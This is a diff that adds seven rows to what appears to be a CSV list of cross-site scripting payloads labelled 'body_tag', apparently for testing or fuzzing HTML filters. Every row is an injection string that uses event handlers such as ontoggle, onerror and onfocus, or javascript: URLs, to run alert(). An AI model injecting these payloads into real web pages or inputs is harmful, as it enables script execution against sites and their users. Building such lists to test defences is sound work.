@@ -102,3 +102,10 @@ body_tag,"<input type='text' value='XSS6' onfocus='alert(this.value)'>href=""h<i
 body_tag,"</style><input type='text' value='XSS6' onfocus='alert(this.value);'><div onmouseover='alert(""XSS6"");'>"
 body_tag,"<embed src='javascript:alert(""XSS9"");'><body onload='alert(""XSS3"");'><input type='submit'>"
 body_tag,"<embed src='javascript:alert(""XSS9"");'><div onmouseover='alert(""XSS6"");'><img src='x' onerror='alert(""XSS9"")'>"
+body_tag,<details open='' ontoggle='alert(1)'><audio src='x' onerror='alert(1)'><source onerror='alert(1)'>
+body_tag,<details open='' ontoggle='alert(1)'><source onerror='alert(1)'><video>
+body_tag,<video><source onerror='alert(1)'><source onerror='alert(1)'>
+body_tag,<video><source onerror='alert(1)'><video>
+body_tag,<video><source onerror='alert(1)'><video>
+body_tag,<details open='' ontoggle='alert(1)'><frame src='javascript:alert(1)'><video>
+body_tag,<details open='' ontoggle='alert(1)'><source onerror='alert(1)'><details open='' ontoggle='alert(1)'>
